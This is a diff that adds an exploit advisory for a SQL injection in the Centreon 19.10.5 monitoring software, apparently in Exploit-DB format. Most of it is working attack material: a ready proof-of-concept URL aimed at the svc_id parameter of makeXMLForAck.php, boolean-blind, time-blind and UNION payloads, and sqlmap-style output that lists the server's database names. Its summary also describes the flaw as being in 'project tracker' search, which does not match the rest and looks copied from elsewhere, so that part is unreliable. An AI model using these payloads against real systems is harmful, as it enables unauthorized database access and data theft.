@@ -1,0 +1,69 @@
+# Exploit Title: Centreon 19.10.5 - 'id' SQL Injection
+# Date: 2020-04-19
+# Exploit Author: Basim alabdullah
+# Vendor Homepage: https://www.centreon.com
+# Software Link: https://download.centreon.com/
+# Version: v.19.10.5
+# Tested on: Centos 5
+
+
+[EXECUTIVE SUMMARY]
+
+ Centreon has come a long way from its early roots. A user-friendly monitoring console on Nagios before, Centreon is today, a rich monitoring platform powered by Centreon Engine, Centreon Broker and Centreon Web.
+
+ Monitoring-savvy IT practitioners who want Nagios-inspired flexibility without its complexity, easily embrace Centreon for robust infrastructure systems and network performance monitoring.
+ Downloaded by hundreds and thousands of IT professionals worldwide.
+ The analysis discovered a time-based blind SQL
+ injection vulnerability in the tracker functionality of
+ Centreon Monitoring software. A malicious user can inject arbitrary
+ SQL commands to the application. The vulnerability lies in the project tracker
+ service search functionality; depending on project visibility successful
+ exploitation may require user authentication. A successful attack
+ can read, modify or delete data from the database or execute arbitrary commands on the underlying system.
+
+[VULNERABLE VERSIONS]
+
+ The following version of the Centreon Monitoring was affected by the
+ vulnerability; previous versions may be vulnerable as well:
+ - Centreon version 19.10.5
+ 
+ 
+[Proof of Concept]
+ 
+ http://TARGET/centreon/include/monitoring/acknowlegement/xml/broker/makeXMLForAck.php?hid=15&svc_id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176706b71%2C%28CASE%20WHEN%20%28ISNULL%28JSON_STORAGE_FREE%28NULL%29%29%29%20THEN%201%20ELSE%200%20END%29%2C0x716b716b71%29%2CNULL%2CNULL%23
+ 
+ 
+ [Payloads]
+ 
+  Parameter: svc_id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: hid=15&svc_id=1 OR NOT 5782=5782
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: hid=15&svc_id=1 AND (SELECT 1615 FROM (SELECT(SLEEP(5)))TRPy)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: hid=15&svc_id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7176706b71,0x724b66756a476759544f48716d61496b5a68754a4c6f42634e6e775272724c44616e567355527a6f,0x716b716b71),NULL,NULL#
+---
+[12:24:35] [INFO] testing MySQL
+[12:24:35] [INFO] confirming MySQL
+[12:24:35] [INFO] the back-end DBMS is MySQL
+[12:24:35] [INFO] fetching banner
+web server operating system: Linux Red Hat
+web application technology: Apache 2.4.34, PHP 7.2.24
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+banner: '10.1.38-MariaDB'
+[12:24:35] [INFO] fetching database names
+[12:24:35] [INFO] starting 4 threads
+[12:24:35] [INFO] resumed: 'centreon'
+[12:24:35] [INFO] resumed: 'test'
+[12:24:35] [INFO] resumed: 'centreon_storage'
+[12:24:35] [INFO] resumed: 'information_schema'
+available databases [4]:                                                                                                                                                               
+[*] centreon
+[*] centreon_storage
+[*] information_schema
+[*] test
